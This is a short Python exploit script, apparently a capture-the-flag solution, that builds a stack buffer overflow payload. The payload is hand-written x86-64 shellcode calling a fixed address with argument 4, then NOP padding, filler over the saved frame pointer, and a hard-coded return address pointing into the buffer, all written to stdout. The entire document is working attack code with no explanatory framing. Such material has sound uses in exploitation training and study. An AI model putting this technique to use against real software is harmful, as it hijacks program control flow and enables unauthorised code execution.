import sys

BUFFER = 0x721000800FD0

SHELLCODE = bytes.fromhex(
    "bf04000000"
    "b8871a4000"
    "ffd0"
)

PADDING = b"\x90" * (16 - len(SHELLCODE))


payload = SHELLCODE + PADDING
payload += b"B" * 8
payload += BUFFER.to_bytes(8, "little")

sys.stdout.buffer.write(payload)


